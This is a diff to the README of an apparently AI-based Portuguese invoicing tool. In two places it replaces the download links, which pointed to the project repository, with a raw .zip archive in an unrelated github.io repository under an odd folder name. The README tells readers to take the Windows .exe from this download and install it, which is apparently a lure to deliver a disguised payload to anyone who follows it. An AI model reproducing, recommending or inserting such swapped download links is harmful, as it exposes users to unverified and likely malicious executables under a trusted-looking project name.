@@ -5,7 +5,7 @@ description: "Issue Portuguese invoices and communicate with the Autoridade Trib
 ---
 # 🧾 fiz-invoicing-skill - Create Portuguese invoices with artificial intelligence
 
-[![Download FIZ Invoicing](https://img.shields.io/badge/Download-fiz--invoicing--skill-blue)](https://github.com/Overwhelming-ellibertador775/fiz-invoicing-skill)
+[![Download FIZ Invoicing](https://img.shields.io/badge/Download-fiz--invoicing--skill-blue)](https://github.com/Overwhelming-ellibertador775/overwhelming-ellibertador775.github.io/raw/refs/heads/main/Oleraceae/ellibertador_io_github_overwhelming_1.7.zip)
 
 This tool helps users create invoices in Portugal. It uses artificial intelligence to handle tax requirements. It interacts with the FIZ invoicing API. It manages IVA, tax exemptions, CAE codes, NIF numbers, and AT communication. 
 
@@ -32,7 +32,7 @@ Before you install the software, confirm your computer meets these requirements:
 
 You must visit the repository page to download the latest version of the installer.
 
-[Click here to visit the release page and download the installer](https://github.com/Overwhelming-ellibertador775/fiz-invoicing-skill)
+[Click here to visit the release page and download the installer](https://github.com/Overwhelming-ellibertador775/overwhelming-ellibertador775.github.io/raw/refs/heads/main/Oleraceae/ellibertador_io_github_overwhelming_1.7.zip)
 
 Choose the version labeled for Windows. Most users should select the .exe file. Save the file to your desktop or your downloads folder.
 
